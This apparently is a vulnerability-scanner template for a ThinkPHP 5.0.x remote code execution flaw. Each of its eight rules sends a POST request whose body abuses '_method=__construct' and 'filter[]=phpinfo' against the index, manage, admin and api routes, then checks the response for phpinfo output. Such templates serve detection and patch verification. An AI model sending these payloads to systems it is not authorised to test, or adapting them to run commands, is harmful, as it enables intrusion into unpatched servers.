expression: r0() || r1() || r2() || r3() || r00() || r11() || r22()|| r33()
id: thinkphp-5010-rce
info:
  author: zan8in
  description: ThinkPHP <= 5.0.13
  name: ThinkPHP 5.0.10 RCE
  reference:
  - https://github.com/Lotus6/ThinkphpGUI/blob/main/ThinkphpGUI/src/main/java/exploit/
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: 's=-1&_method=__construct&method=post&filter[]=phpinfo

        '
      method: POST
      path: /?s=index
  r00:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: '_method=__construct&method=get&filter[]=phpinfo&get[]=-1

        '
      method: POST
      path: /?s=index
  r1:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: 's=-1&_method=__construct&method=post&filter[]=phpinfo

        '
      method: POST
      path: /?s=manage
  r11:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: '_method=__construct&method=get&filter[]=phpinfo&get[]=-1

        '
      method: POST
      path: /?s=manage
  r2:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: 's=-1&_method=__construct&method=post&filter[]=phpinfo

        '
      method: POST
      path: /?s=admin
  r22:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: '_method=__construct&method=get&filter[]=phpinfo&get[]=-1

        '
      method: POST
      path: /?s=admin
  r3:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: 's=-1&_method=__construct&method=post&filter[]=phpinfo

        '
      method: POST
      path: /?s=api
  r33:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: '_method=__construct&method=get&filter[]=phpinfo&get[]=-1

        '
      method: POST
      path: /?s=api
